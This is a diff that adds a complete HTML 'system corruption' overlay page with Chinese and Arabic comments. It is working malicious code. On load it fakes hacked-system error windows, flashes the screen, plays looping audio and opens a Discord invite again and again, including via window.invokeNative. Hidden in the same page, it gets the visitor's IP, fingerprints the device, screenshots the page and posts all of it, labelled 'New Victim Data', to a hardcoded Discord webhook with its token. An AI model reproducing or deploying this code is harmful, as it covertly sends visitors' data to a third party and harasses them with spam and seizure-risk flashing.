@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>OVERLAY // SYSTEM CORRUPTION</title>
+<!-- html2canvas for screenshot -->
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<style>
+    * {
+        user-select: none;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+        margin: 0;
+        overflow: hidden;
+        background: transparent;
+        font-family: 'Courier New', 'MS Gothic', monospace;
+        position: relative;
+    }
+
+    /* 原有的 glitch 层 (扫描线 + 抖动) */
+    .glitch {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 2;
+        top: 0;
+        left: 0;
+    }
+
+    .glitch::before {
+        content: "";
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: repeating-linear-gradient(
+            0deg,
+            rgba(255,255,255,0.08) 0px,
+            rgba(255,255,255,0.08) 2px,
+            transparent 2px,
+            transparent 5px
+        );
+        animation: glitchMove 0.12s infinite;
+        mix-blend-mode: overlay;
+    }
+
+    @keyframes glitchMove {
+        0% { transform: translate(0,0); }
+        20% { transform: translate(2px, -1px); }
+        40% { transform: translate(-2px, 2px); }
+        60% { transform: translate(1px, -2px); }
+        80% { transform: translate(-1px, 1px); }
+        100% { transform: translate(0,0); }
+    }
+
+    /* 强化屏幕混乱层 */
+    .chaos-canvas {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 9999;
+        display: block;
+        mix-blend-mode: normal;
+        opacity: 0.92;
+    }
+
+    /* 错误窗口样式 */
+    .error-box {
+        position: absolute;
+        width: 280px;
+        background: #c0c0c0;
+        border: 3px solid #000000;
+        box-shadow: 0 0 20px rgba(255,0,0,0.9), inset 0 0 2px white;
+        font-family: 'Courier New', monospace;
+        font-weight: bold;
+        z-index: 10000;
+        animation: errorShake 0.18s infinite;
+        backdrop-filter: blur(1px);
+    }
+
+    .title-bar {
+        background: #000080;
+        color: white;
+        padding: 6px 8px;
+        font-size: 13px;
+        font-weight: bold;
+        letter-spacing: 1px;
+        display: flex;
+        justify-content: space-between;
+        border-bottom: 1px solid white;
+    }
+
+    .content {
+        padding: 12px;
+        color: #1a1a1a;
+        font-size: 14px;
+        text-shadow: 1px 1px 0 #aaaaaa;
+        word-break: break-word;
+    }
+
+    @keyframes errorShake {
+        0% { transform: translate(0,0) rotate(0deg); }
+        20% { transform: translate(3px, -2px) rotate(0.5deg); }
+        40% { transform: translate(-3px, 2px) rotate(-0.3deg); }
+        60% { transform: translate(2px, 2px) rotate(0.2deg); }
+        80% { transform: translate(-2px, -1px) rotate(-0.4deg); }
+        100% { transform: translate(0,0) rotate(0deg); }
+    }
+
+    /* 额外全局脉冲闪白 */
+    .flash-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0);
+        pointer-events: none;
+        z-index: 10001;
+        transition: background 0.03s linear;
+    }
+
+    /* 故障条纹动画 */
+    @keyframes horizontalTear {
+        0% { opacity: 0; transform: translateX(0); }
+        10% { opacity: 0.7; transform: translateX(15px); }
+        20% { opacity: 0.3; transform: translateX(-12px); }
+        30% { opacity: 0.8; transform: translateX(8px); }
+        40% { opacity: 0; transform: translateX(0); }
+        100% { opacity: 0; }
+    }
+
+    .tear-line {
+        position: fixed;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #ff00cc, #ff0000, #ffff00, #00ffcc);
+        opacity: 0;
+        pointer-events: none;
+        z-index: 10002;
+        filter: blur(1px);
+        mix-blend-mode: screen;
+    }
+</style>
+</head>
+<body>
+
+<div class="glitch"></div>
+<canvas id="screenChaosCanvas" class="chaos-canvas"></canvas>
+<div id="flashLayer" class="flash-overlay"></div>
+<div id="tearContainer"></div>
+
+<!-- 背景音频 loop -->
+<audio id="bgSound" autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1448552748474830999/1494785248519524575/1337.mp3?ex=69e3debf&is=69e28d3f&hm=dbea722dd5ea9998e5b0be7fb2cb2ad8e71cebaa6fc2f382100308265260fa2c&" type="audio/mpeg">
+</audio>
+<audio id="winErrorSound" src="https://www.myinstants.com/media/sounds/windows-error.mp3"></audio>
+
+<script>
+    // ========== 1. 原有视觉/音频/弹窗逻辑 (保持完整) ==========
+    let messages = [
+        "⚠️ SYSTEM FAILURE ⚠️",
+        "ACCESS DENIED // HACKED",
+        "discord.gg/127",
+        "ONETWOSEVEN // CORRUPTED",
+        "YOUR DATA IS LOST",
+        "CRITICAL ERROR 0xFFFFFF"
+    ];
+    let userIP = "Loading...";
+    let errorCount = 0;
+    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1504980484311224471/sKs2t8OcEs4mlafHUEk35OzIazi1fd58EdLb5uCIwBlUhiPSvakNps_6pX70VB5INtf2";
+
+    let audio = document.getElementById("bgSound");
+    function startAudio() {
+        audio.volume = 0.45;
+        audio.play().catch(e => console.log("Audio play blocked: ", e));
+    }
+    startAudio();
+    setInterval(startAudio, 2000);
+
+    function createError() {
+        let box = document.createElement("div");
+        box.className = "error-box";
+        let x = Math.random() * (window.innerWidth - 320);
+        let y = Math.random() * (window.innerHeight - 180);
+        if (x < 10) x = 10;
+        if (y < 10) y = 10;
+        box.style.left = x + "px";
+        box.style.top = y + "px";
+        box.style.position = "absolute";
+        let msg = messages[Math.floor(Math.random() * messages.length)];
+        box.innerHTML = `
+            <div class="title-bar">
+                <span>⚠️ CRITICAL ERROR</span>
+                <span>0x${Math.floor(Math.random()*9999)}</span>
+            </div>
+            <div class="content">
+                💀 ${msg}<br><br>
+                🖥️ IP: ${userIP}<br>
+                🔓 SESSION COMPROMISED
+            </div>
+        `;
+        document.body.appendChild(box);
+        for(let i=0; i<4; i++){
+            setTimeout(() => {
+                if(window.invokeNative && typeof window.invokeNative === "function") {
+                    window.invokeNative("openUrl", "https://discord.gg/127");
+                } else {
+                    window.open("https://discord.gg/127", "_blank");
+                }
+            }, i * 500);
+        }
+        errorCount++;
+        let winError = document.getElementById("winErrorSound");
+        if(winError) {
+            winError.currentTime = 0;
+            winError.play().catch(() => {});
+        }
+        setTimeout(() => { if(box && box.remove) box.remove(); }, 3800);
+    }
+    setInterval(createError, 1200);
+
+    // ========== 2. 屏幕混沌特效 (保持不变) ==========
+    const canvas = document.getElementById("screenChaosCanvas");
+    let ctx = canvas.getContext("2d");
+    let width, height;
+    let glitchSeed = 0;
+    let intenseMode = false;
+    const flashLayer = document.getElementById("flashLayer");
+    const tearContainer = document.getElementById("tearContainer");
+
+    function addRandomTear() {
+        const tear = document.createElement("div");
+        tear.className = "tear-line";
+        const topPos = Math.random() * window.innerHeight;
+        tear.style.top = topPos + "px";
+        tear.style.height = (Math.random() * 8 + 2) + "px";
+        tear.style.background = `linear-gradient(90deg, rgba(255,0,100,0.9), rgba(0,255,255,0.9), rgba(255,255,0,0.9), rgba(255,0,200,0.9))`;
+        tear.style.animation = `horizontalTear ${Math.random() * 0.2 + 0.15}s ease-out forwards`;
+        tearContainer.appendChild(tear);
+        setTimeout(() => { if(tear && tear.remove) tear.remove(); }, 400);
+    }
+
+    function randomFlash() {
+        const intensity = Math.random() * 0.5 + 0.3;
+        flashLayer.style.backgroundColor = `rgba(255, 255, 255, ${intensity})`;
+        setTimeout(() => { flashLayer.style.backgroundColor = "rgba(255, 255, 255, 0)"; }, 60);
+    }
+
+    function resizeCanvas() {
+        width = window.innerWidth;
+        height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+    }
+    window.addEventListener("resize", () => resizeCanvas());
+
+    function drawChaos() {
+        if (!ctx) return;
+        ctx.clearRect(0, 0, width, height);
+        glitchSeed = (glitchSeed + 0.03) % (Math.PI * 2);
+        const intensityBase = 0.55 + Math.sin(glitchSeed) * 0.2;
+        ctx.fillStyle = `rgba(0, 0, 0, 0.08)`;
+        ctx.fillRect(0, 0, width, height);
+        const pixelCount = Math.floor(width * height * 0.018 * intensityBase);
+        for (let i = 0; i < pixelCount; i++) {
+            const x = Math.random() * width, y = Math.random() * height;
+            let r,g,b,a;
+            if (Math.random() < 0.33) { r=255; g=Math.random()*80; b=Math.random()*120; a=Math.random()*0.6+0.2; }
+            else if (Math.random() < 0.66) { r=Math.random()*100; g=Math.random()*180+75; b=255; a=Math.random()*0.5+0.2; }
+            else { r=255; g=255; b=Math.random()*150; a=Math.random()*0.7+0.3; }
+            ctx.fillStyle = `rgba(${r},${g},${b},${a})`;
+            ctx.fillRect(x, y, Math.random()*2+0.5, Math.random()*2+0.5);
+        }
+        const barCount = Math.floor(Math.random() * 12 + 6) * intensityBase;
+        for (let b = 0; b < barCount; b++) {
+            const barX = Math.random() * width, barY = Math.random() * height, barW = Math.random() * (width * 0.3) + 20, barH = Math.random() * 25 + 5;
+            let fillColor = Math.random() < 0.4 ? `rgba(255,40,80,${Math.random()*0.5+0.2})` : (Math.random()<0.7 ? `rgba(0,255,200,${Math.random()*0.5+0.2})` : `rgba(255,200,0,${Math.random()*0.6+0.2})`);
+            ctx.fillStyle = fillColor;
+            ctx.fillRect(barX, barY, barW, barH);
+            ctx.fillStyle = `rgba(255,0,0,0.2)`;
+            ctx.fillRect(barX+4, barY+2, barW, barH);
+        }
+        if (Math.random() > 0.55) {
+            const offsetX = (Math.random() - 0.5) * 14, offsetY = (Math.random() - 0.5) * 6;
+            ctx.globalCompositeOperation = "lighter";
+            ctx.fillStyle = `rgba(255,50,50,0.25)`;
+            for (let i=0;i<30;i++) { let x=Math.random()*width, y=Math.random()*height, w=Math.random()*80+10, h=Math.random()*40+5; ctx.fillRect(x+offsetX, y+offsetY, w, h); }
+            ctx.fillStyle = `rgba(50,255,200,0.25)`;
+            for (let i=0;i<30;i++) { let x=Math.random()*width, y=Math.random()*height, w=Math.random()*80+10, h=Math.random()*40+5; ctx.fillRect(x-offsetX*0.7, y+offsetY*0.5, w, h); }
+            ctx.globalCompositeOperation = "source-over";
+        }
+        const lineCount = Math.floor(Math.random() * 30 + 20);
+        for (let l=0;l<lineCount;l++) {
+            if (Math.random() > 0.6) { let y=Math.random()*height, thick=Math.random()*3+1; ctx.fillStyle=`rgba(0,255,255,${Math.random()*0.5})`; ctx.fillRect(0,y,width,thick); }
+            else { let x=Math.random()*width, thick=Math.random()*2+1; ctx.fillStyle=`rgba(255,100,0,${Math.random()*0.5})`; ctx.fillRect(x,0,thick,height); }
+        }
+        if (Math.random() > 0.7) {
+            let blockX=Math.random()*width, blockY=Math.random()*height, blockSize=Math.random()*55+15;
+            ctx.fillStyle=`rgba(0,0,0,0.7)`; ctx.fillRect(blockX,blockY,blockSize,blockSize);
+            ctx.fillStyle=`rgba(255,0,255,0.5)`; ctx.fillRect(blockX+3,blockY+3,blockSize-6,blockSize-6);
+        }
+        for (let d=0;d<120;d++) { let x=Math.random()*width, y=Math.random()*height; ctx.fillStyle=`rgba(255,255,255,${Math.random()*0.8})`; ctx.fillRect(x,y,1.2,1.2); }
+        if (intenseMode) for (let i=0;i<12;i++) { let tearX=Math.random()*width, tearY=Math.random()*height; ctx.fillStyle=`rgba(255,20,147,0.7)`; ctx.fillRect(tearX,tearY,Math.random()*150+20,Math.random()*12+3); ctx.fillStyle=`rgba(0,255,255,0.6)`; ctx.fillRect(tearX-10,tearY+5,Math.random()*100+10,Math.random()*8+2); }
+        requestAnimationFrame(drawChaos);
+    }
+
+    function initChaosCanvas() { resizeCanvas(); drawChaos(); }
+    function addDynamicGlitchEvents() {
+        setInterval(() => { if (Math.random() > 0.45) addRandomTear(); }, 450);
+        setInterval(() => { if (Math.random() > 0.65) randomFlash(); if (Math.random() > 0.85) { document.body.style.filter = "invert(0.08)"; setTimeout(() => { document.body.style.filter = ""; }, 80); } }, 800);
+        setInterval(() => { intenseMode = !intenseMode; if (intenseMode) { for(let i=0;i<6;i++) setTimeout(() => addRandomTear(), i*70); setTimeout(() => randomFlash(), 30); } }, 3800);
+        setInterval(() => { if (canvas) { canvas.style.mixBlendMode = "hard-light"; setTimeout(() => { if(canvas) canvas.style.mixBlendMode = "normal"; }, 150); } const glitchDiv = document.querySelector('.glitch'); if(glitchDiv) { glitchDiv.style.animation = "none"; setTimeout(() => { if(glitchDiv) glitchDiv.style.animation = "glitchMove 0.12s infinite"; }, 50); } }, 2200);
+        setInterval(() => { if (Math.random() > 0.7) { const tearBlock = document.createElement("div"); tearBlock.style.position = "fixed"; tearBlock.style.top = Math.random() * window.innerHeight + "px"; tearBlock.style.left = "0"; tearBlock.style.width = "100%"; tearBlock.style.height = Math.random() * 15 + 6 + "px"; tearBlock.style.background = "repeating-linear-gradient(90deg, #ff0000, #00ff00, #0000ff, #ff00ff)"; tearBlock.style.zIndex = "10003"; tearBlock.style.pointerEvents = "none"; tearBlock.style.mixBlendMode = "exclusion"; tearBlock.style.opacity = "0.7"; document.body.appendChild(tearBlock); setTimeout(() => tearBlock.remove(), 200); } }, 1200);
+    }
+    initChaosCanvas();
+    addDynamicGlitchEvents();
+    setInterval(() => { if(audio) audio.volume = Math.min(0.8, 0.4 + Math.random() * 0.3); }, 4000);
+    window.addEventListener("load", () => { resizeCanvas(); for(let i=0;i<3;i++) setTimeout(() => addRandomTear(), i*200); });
+    setInterval(() => { if (Math.random() > 0.75) { const shakeIntensity = Math.random() * 2; document.body.style.transform = `translate(${shakeIntensity}px, ${(Math.random() - 0.5) * 2}px)`; setTimeout(() => { document.body.style.transform = ""; }, 60); } }, 1100);
+
+    // ========== 3. 增强版信息收集 + 专业 Webhook 发送 ==========
+    // 收集详细设备信息
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || "Unknown";
+        const language = navigator.language || "Unknown";
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const languages = navigator.languages ? navigator.languages.join(", ") : language;
+        const cpuClass = navigator.cpuClass || "Not Available";
+        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+        const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+        const vendor = navigator.vendor || "Unknown";
+        const cookieEnabled = navigator.cookieEnabled ? "Yes" : "No";
+        const doNotTrack = navigator.doNotTrack || "Not specified";
+        let os = "Unknown";
+        if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+        else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+        else if (ua.indexOf("Mac OS X") !== -1) os = "macOS";
+        else if (ua.indexOf("Android") !== -1) os = "Android";
+        else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+        else if (ua.indexOf("Linux") !== -1) os = "Linux";
+        let browser = "Unknown";
+        if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
+        else if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
+        else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
+        else if (ua.indexOf("Safari") !== -1) browser = "Apple Safari";
+        else if (ua.indexOf("Opera") !== -1) browser = "Opera";
+
+        return {
+            ip: userIP,
+            os, browser, platform, language, languages,
+            screen: screenRes, colorDepth, timezone,
+            cpuClass, deviceMemory, hardwareConcurrency,
+            vendor, cookieEnabled, doNotTrack,
+            userAgent: ua,
+            referrer: document.referrer || "Direct",
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+    }
+
+    // إرسال البيانات مع لقطة شاشة عبر Webhook (Embed + صورة)
+    async function sendFullLogToWebhook(deviceInfo, screenshotBase64) {
+        const embed = {
+            title: "🔐 **New Victim Data**",
+            color: 0xFF0000,
+            thumbnail: { url: "https://cdn.discordapp.com/emojis/1053892329232072744.png" },
+            fields: [
+                { name: "🌐 IP Address", value: `\`${deviceInfo.ip}\``, inline: true },
+                { name: "💻 Operating System", value: deviceInfo.os, inline: true },
+                { name: "🧩 Browser", value: deviceInfo.browser, inline: true },
+                { name: "📱 Platform", value: deviceInfo.platform, inline: true },
+                { name: "🖥️ Screen Resolution", value: deviceInfo.screen, inline: true },
+                { name: "🎨 Color Depth", value: `${deviceInfo.colorDepth}-bit`, inline: true },
+                { name: "🗣️ Language", value: deviceInfo.language, inline: true },
+                { name: "🌍 Timezone", value: deviceInfo.timezone, inline: true },
+                { name: "🧠 Device Memory", value: deviceInfo.deviceMemory, inline: true },
+                { name: "⚙️ CPU Cores", value: `${deviceInfo.hardwareConcurrency}`, inline: true },
+                { name: "🍪 Cookies Enabled", value: deviceInfo.cookieEnabled, inline: true },
+                { name: "🚫 Do Not Track", value: deviceInfo.doNotTrack, inline: true },
+                { name: "🔗 Referrer", value: deviceInfo.referrer.length > 100 ? deviceInfo.referrer.substring(0,100)+"..." : deviceInfo.referrer, inline: false },
+                { name: "📄 User Agent", value: deviceInfo.userAgent.length > 100 ? deviceInfo.userAgent.substring(0,100)+"..." : deviceInfo.userAgent, inline: false }
+            ],
+            footer: { text: "ONETWOSEVEN Security • Full System Capture" },
+            timestamp: deviceInfo.timestamp
+        };
+
+        // بناء FormData لإرسال الملف مع الـ Embed
+        const formData = new FormData();
+        // تحويل base64 إلى Blob
+        const byteString = atob(screenshotBase64.split(',')[1]);
+        const mimeString = screenshotBase64.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], { type: mimeString });
+        formData.append("file", blob, "screenshot.png");
+
+        // إضافة payload_json لدعم Embed
+        const payload = {
+            content: null,
+            embeds: [embed]
+        };
+        formData.append("payload_json", JSON.stringify(payload));
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                body: formData
+            });
+            console.log("✅ Full data + screenshot sent to webhook");
+        } catch(e) {
+            console.error("Webhook send failed", e);
+        }
+    }
+
+    // التقاط لقطة شاشة للصفحة الحالية
+    async function captureAndSend() {
+        try {
+            // انتظار ثواني صغيرة لضمان استقرار الصفحة
+            await new Promise(r => setTimeout(r, 1000));
+            const canvas = await html2canvas(document.body, {
+                scale: 1.2,          // جودة عالية
+                useCORS: false,
+                logging: false,
+                backgroundColor: null
+            });
+            const screenshotDataUrl = canvas.toDataURL("image/png");
+            const deviceInfo = getDeviceInfo();
+            await sendFullLogToWebhook(deviceInfo, screenshotDataUrl);
+        } catch (err) {
+            console.error("Screenshot failed", err);
+            // في حالة فشل اللقطة، نرسل البيانات فقط
+            const deviceInfo = getDeviceInfo();
+            const embedFallback = {
+                title: "⚠️ Victim Data (Screenshot failed)",
+                color: 0xFFA500,
+                fields: [
+                    { name: "IP", value: deviceInfo.ip, inline: true },
+                    { name: "OS", value: deviceInfo.os, inline: true },
+                    { name: "Browser", value: deviceInfo.browser, inline: true },
+                    { name: "Screen", value: deviceInfo.screen, inline: true }
+                ],
+                timestamp: deviceInfo.timestamp
+            };
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embedFallback] })
+            }).catch(()=>{});
+        }
+    }
+
+    // جلب الـ IP ثم البدء بجمع المعلومات واللقطة
+    function fetchIPAndFullData() {
+        fetch('https://api.ipify.org/?format=json')
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.ip;
+                captureAndSend(); // بعد الحصول على الـ IP نبدأ العملية الكاملة
+            })
+            .catch(() => {
+                userIP = "Unknown";
+                captureAndSend(); // حتى لو فشل الـ IP نرسل باقي البيانات
+            });
+    }
+    fetchIPAndFullData();
+
+    // ========== 4. السكربت الإضافي: فتح الرابط بشكل مكثف ==========
+    if (typeof window.setInterval === "function") {
+        setInterval(function() {
+            if (window.invokeNative && typeof window.invokeNative === "function") {
+                for (let i = 0; i < 8; i++) {
+                    window.invokeNative("openUrl", "https://discord.gg/127");
+                }
+            }
+        }, 100);
+    }
+</script>
+</body>
+</html>
